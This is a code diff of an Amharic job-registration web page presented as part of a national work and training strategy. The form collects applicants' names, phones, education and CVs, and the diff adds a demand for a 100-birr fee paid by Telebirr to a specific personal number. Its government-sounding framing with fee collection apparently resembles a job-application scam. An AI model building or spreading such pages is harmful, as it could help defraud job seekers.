@@ -5,17 +5,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>የሥራና ስልጠና ስትራቴጂ ማገዣ መድረክ</title>
     <style>
-        :root { --primary: #0056b3; --success: #28a745; --text: #333; }
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f7f6; margin: 0; padding: 20px; display: flex; justify-content: center; }
+        :root { --primary: #0056b3; --success: #28a745; --bg: #f4f7f6; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: var(--bg); margin: 0; padding: 20px; display: flex; justify-content: center; }
         .container { background: #fff; max-width: 800px; width: 100%; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        .page { display: none; animation: fadeIn 0.6s ease; }
+        .page { display: none; animation: fadeIn 0.5s; }
         .active { display: block; }
-        .header-box { text-align: justify; line-height: 1.8; }
-        .hero-btn { display: block; width: 100%; max-width: 300px; margin: 30px auto; padding: 15px; background: var(--primary); color: #fff; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .header-box { text-align: justify; line-height: 1.8; margin-bottom: 20px; }
+        .hero-btn { display: block; width: 100%; max-width: 300px; margin: 30px auto; padding: 15px; background: var(--primary); color: #fff; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; text-align: center; text-decoration: none; }
         .tab { display: none; }
-        input, select, textarea { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; }
+        input, select, textarea { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
+        input:invalid { border-color: #ffcccc; }
         .success-box { text-align: center; border: 2px solid var(--success); padding: 30px; border-radius: 12px; background: #f0fff4; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .payment-alert { background: #fff3cd; padding: 15px; border-radius: 8px; border-left: 5px solid #ffc107; font-weight: bold; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
@@ -34,29 +36,40 @@
     <div id="formPage" class="page">
         <form id="regForm" name="job-app" method="POST" data-netlify="true" enctype="multipart/form-data">
             <input type="hidden" name="form-name" value="job-app" />
+            
             <div class="tab">
-                <h3>ደረጃ 1፡ የግል መረጃ</h3>
-                <input id="userName" name="full_name" placeholder="ሙሉ ስም (ከነአባት)" required>
-                <input name="phone" placeholder="ስልክ ቁጥር" required>
-                <input name="edu" placeholder="የትምህርት ደረጃ" required>
+                <h3 style="color: var(--primary);">ደረጃ 1፡ የግል መረጃ</h3>
+                <label>ሙሉ ስም (ከነአባት) *</label>
+                <input id="userName" name="full_name" placeholder="ለምሳሌ፡ አበበ በቀለ ካሳ" required>
+                <label>ስልክ ቁጥር *</label>
+                <input name="phone" type="tel" placeholder="09..." required>
+                <label>የትምህርት ደረጃ *</label>
+                <input name="edu" placeholder="ለምሳሌ፡ በሲቪል ምህንድስና ዲግሪ" required>
             </div>
+
             <div class="tab">
-                <h3>ደረጃ 2፡ ክፍያና ፋይሎች</h3>
-                <p>100 ብር በቴሌብር (09XXXXXXXX) ከፍለው ደረሰኙን ይጫኑ።</p>
+                <h3 style="color: var(--primary);">ደረጃ 2፡ ክፍያና ፋይሎች</h3>
+                <div class="payment-alert">
+                    የምዝገባ አገልግሎት ክፍያ 100 ብር በቴሌብር ቁጥር <span style="color:red">0924364056</span> ከፍለው ደረሰኙን እዚህ ያያይዙ።
+                </div>
+                <label style="margin-top:15px; display:block;">የክፍያ ደረሰኝ (ፎቶ) *</label>
                 <input type="file" name="receipt" accept="image/*" required>
-                <input type="file" name="cv" accept=".pdf" required>
+                <label>ሲቪ (CV/Resume) *</label>
+                <input type="file" name="cv" accept=".pdf,.doc,.docx" required>
             </div>
+
             <div style="display:flex; gap:10px; margin-top:20px;">
-                <button type="button" id="prevBtn" onclick="nextPrev(-1)" style="flex:1; padding:12px;">ተመለስ</button>
-                <button type="button" id="nextBtn" onclick="nextPrev(1)" style="flex:1; padding:12px; background:var(--primary); color:#fff;">ቀጥል</button>
+                <button type="button" id="prevBtn" onclick="nextPrev(-1)" style="flex:1; background:#ccc;">ተመለስ</button>
+                <button type="button" id="nextBtn" onclick="nextPrev(1)" style="flex:1; background:var(--primary); color:#fff;">ቀጥል</button>
             </div>
         </form>
     </div>
 
     <div id="successPage" class="page">
         <div class="success-box">
-            <h2 id="displayTitle" style="color: var(--success);"></h2>
-            <p style="text-align: justify; font-size: 17px; line-height: 1.8;">
+            <div style="font-size: 50px; color: var(--success);">✔</div>
+            <h2 id="displayTitle" style="color: var(--success);">እንኳን ደስ አላችሁ!</h2>
+            <p id="successBody" style="text-align: justify; font-size: 17px; line-height: 1.8; color: #444;">
                 የኢትዮጵያ የሥራና ስልጠና ስትራቴጂ አካል ለመሆን ያደረጉት ምዝገባ በስኬት ተጠናቅቋል። መረጃዎ በዲጂታል የመረጃ ቋታችን ውስጥ በአግባቡ ተቀምጧል። ይህ ምዝገባ የእርስዎን ሙያዊ ብቃት ከሀገራዊ የልማት ግቦች ጋር ለማስተሳሰር የሚደረግ የሂደት መጀመሪያ ነው። 
                 <br><br>
                 ያስገቡት መረጃ እና የክፍያ ደረሰኝ በባለሙያዎች ተረጋግጦ፣ በቀጣይ 7 የሥራ ቀናት ውስጥ በስልክዎ ወይም በኢሜልዎ ዝርዝር መረጃ ይደርስዎታል። ለሀገር ግንባታ ላሳዩት ዝግጁነት እናመሰግናለን!
@@ -69,28 +82,58 @@
 
 <script>
     var currentTab = 0;
-    function showForm() { document.getElementById("welcomePage").classList.remove("active"); document.getElementById("formPage").classList.add("active"); showTab(0); }
+
+    function showForm() {
+        document.getElementById("welcomePage").classList.remove("active");
+        document.getElementById("formPage").classList.add("active");
+        showTab(0);
+    }
+
     function showTab(n) {
         var x = document.getElementsByClassName("tab");
         x[n].style.display = "block";
-        document.getElementById("prevBtn").style.display = (n==0) ? "none" : "inline";
-        document.getElementById("nextBtn").innerHTML = (n == x.length-1) ? "ምዝገባውን ጨርስ" : "ቀጥል";
+        document.getElementById("prevBtn").style.display = (n == 0) ? "none" : "inline";
+        document.getElementById("nextBtn").innerHTML = (n == x.length - 1) ? "ምዝገባውን ጨርስ" : "ቀጥል";
     }
+
     function nextPrev(n) {
         var x = document.getElementsByClassName("tab");
-        if (n == 1 && !document.getElementById("regForm").checkValidity()) { alert("እባክዎ መረጃዎችን በትክክል ይሙሉ"); return; }
+        // Validation check
+        if (n == 1) {
+            var inputs = x[currentTab].getElementsByTagName("input");
+            for (var i = 0; i < inputs.length; i++) {
+                if (inputs[i].hasAttribute("required") && inputs[i].value == "") {
+                    alert("እባክዎ ሁሉንም መረጃዎች በትክክል ይሙሉ (ፋይሎችን ማያያዝዎን ያረጋግጡ)");
+                    return false;
+                }
+            }
+        }
+
         x[currentTab].style.display = "none";
-        currentTab += n;
-        if (currentTab >= x.length) { submitForm(); return; }
+        currentTab = currentTab + n;
+
+        if (currentTab >= x.length) {
+            submitForm();
+            return false;
+        }
         showTab(currentTab);
     }
+
     function submitForm() {
         const name = document.getElementById("userName").value;
         const form = document.getElementById("regForm");
-        fetch("/", { method: "POST", body: new FormData(form) }).then(() => {
+        const formData = new FormData(form);
+
+        // Netlify submission
+        fetch("/", {
+            method: "POST",
+            body: formData
+        }).then(() => {
             document.getElementById("formPage").classList.remove("active");
             document.getElementById("successPage").classList.add("active");
             document.getElementById("displayTitle").innerHTML = "እንኳን ደስ አላችሁ " + name + "!";
+        }).catch(() => {
+            alert("የግንኙነት ችግር አጋጥሟል፣ እባክዎ በድጋሚ ይሞክሩ።");
         });
     }
 </script>
